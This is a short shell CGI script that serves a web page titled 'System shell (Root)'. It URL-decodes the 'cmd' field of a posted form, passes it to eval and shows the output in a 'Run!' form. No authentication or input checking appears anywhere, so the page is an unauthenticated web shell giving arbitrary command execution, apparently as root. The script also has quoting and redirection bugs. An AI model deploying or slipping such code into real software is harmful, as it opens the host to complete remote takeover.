#!/bin/sh

# Copyed from: http://www.team2053.org/docs/bashcgi/postdata.html
cgi_decodevar ()
{
    [ $# -ne 1 ] && return
    local v t h
    # replace all + with whitespace and append %%
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" # digest up to the first %
	t="${t#*%}"       # remove digested part
	# decode if there is anything to decode and if not at end of string
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} # save first two chars
	    t="${t:2}" # remove these
	    v="${v}"`echo -e \\\\x${h}` # convert hex to special char
	fi
    done
    # return decoded string
    echo "${v}"
    return
}

echo "<h1>System shell (Root)</h1>"

read DATA

if [ $DATA != "" ]; then
	eval $(cgi_decodevar $(echo $DATA | cut -d'=' -f2)) 2>&1 > tmp/shelloutput
fi

echo "<pre><code>`cat tmp/shelloutput`</code></pre>"
echo "<form method=\"post\" action=\"?p=shell\">
	<input type=\"text\" name=\"cmd\">
	<input type=\"submit\" value=\"Run!\">
</form>"
